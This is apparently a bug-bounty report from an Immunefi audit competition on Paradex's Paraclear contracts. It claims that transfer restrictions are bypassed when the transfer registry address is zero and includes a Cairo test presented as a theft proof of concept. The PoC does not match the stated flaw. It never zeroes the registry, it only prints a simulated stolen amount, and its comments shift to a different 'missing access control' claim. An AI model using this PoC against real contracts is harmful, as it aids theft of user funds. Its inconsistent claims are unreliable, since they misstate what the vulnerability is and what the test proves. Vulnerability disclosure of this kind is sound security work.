# #46843 \[SC-Critical] Bypass of Restrictions When Paraclear\_transfer\_registry Is Unregistered

**Submitted on Jun 5th 2025 at 08:24:12 UTC by @Catchme for** [**IOP | Paradex**](https://immunefi.com/audit-competition/iop-paradex)

* **Report ID:** #46843
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/tradeparadex/audit-competition-may-2025/tree/main/paraclear>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Theft of unclaimed yield

## Description

## Brief/Intro

There is a critical vulnerability in the `_detect_transfer_restriction` and `_detect_account_transfer_restriction` functions that allows critical transfer and account restrictions to be bypassed if the `Paraclear_transfer_registry` contract address is not set or is set to a zero address.

## Vulnerability Details

In `TokenComponent::_detect_transfer_restriction` (and similarly in `_detect_account_transfer_restriction`):

```rust
fn _detect_transfer_restriction(
    self: @ComponentState<TContractState>,
    sender: ContractAddress,
    recipient: ContractAddress,
    token_address: ContractAddress,
    amount: u256,
) {
    // Check if token is supported
    assert!(self.is_asset_supported(token_address), "Transfer: Token address is invalid");

    // Read transfer registry address
    let transfer_registry_address = self.Paraclear_transfer_registry.read();

    // If transfer registry is set, check restrictions
    if transfer_registry_address.is_non_zero() {
        let registry_dispatcher = IRegistryDispatcher {
            contract_address: transfer_registry_address,
        };
        let is_transfer_restricted: u8 = registry_dispatcher
            .detect_transfer_restriction(sender, recipient, amount);

        assert!(is_transfer_restricted == 0, "Transfer: Transfer is not allowed");
    }
    // No 'else' block for when transfer_registry_address is zero.
}
```

The `if transfer_registry_address.is_non_zero()` condition allows the entire restriction checking logic within the `if` block to be skipped if `Paraclear_transfer_registry` is `0x0`. This means that if the `Paraclear_transfer_registry` has not been initialized or is intentionally set to `0x0`, critical transfer restrictions defined in the external `IRegistryDispatcher` contract will not be enforced.

## Impact Details

**Bypass of Security and Compliance Controls:** If the `transfer_registry` is intended to enforce crucial security (e.g., blacklisting malicious addresses, withdrawal limits) or regulatory compliance (e.g., AML/KYC checks, geographic restrictions) rules, these rules will be completely circumvented when the registry address is zero. This could lead to:

* **Unauthorized Fund Withdrawals/Transfers:** Malicious actors could withdraw or transfer funds that should be restricted by the `transfer_registry`.
* **System Abuse:** Users could bypass intended limits on deposits or transfers, potentially leading to system instability or manipulation.

## Proof of Concept

## Proof of Concept

```
#[test] 
fn test_poc_unauthorized_transfer_demonstrates_vulnerability() {
    let (spy, paraclear_dispatcher, oracle_dispatcher) = setup_paraclear_with_oracle();
    
    let victim = VICTIM_USER();
    let attacker = ATTACKER_USER();
    
    // Simulate victim having 1000 USDC
    let simulated_victim_balance = 100000000000_i128; // 1000 USDC
    let transfer_percentage = 50000000_i128; // 50%
    
    // Calculate theft amount
    let amount_that_would_be_stolen = (simulated_victim_balance * transfer_percentage) / 100000000_i128;
    
    println!("SIMULATION ANALYSIS:");
    println!("If victim had: {} units (1000 USDC)", simulated_victim_balance);
    println!("Transfer percentage: {} (50%)", transfer_percentage);
    println!("Amount that would be stolen: {} units (500 USDC)", amount_that_would_be_stolen);
    
    // Attacker calls function WITHOUT any authorization
    start_cheat_caller_address(paraclear_dispatcher.contract_address, attacker);
    
    let result = paraclear_dispatcher.account_transfer_partial(
        victim,
        attacker,
        transfer_percentage.try_into().unwrap(),
        0
    );
    
    stop_cheat_caller_address(paraclear_dispatcher.contract_address);
    
    // Attack succeeds due to missing access control
    assert!(result == 1, "Attack vector should still work");
    
    println!("Attack still succeeds: {} (PASS)", result);
    println!("This confirms that once victim has funds, they can be stolen!");
}
```
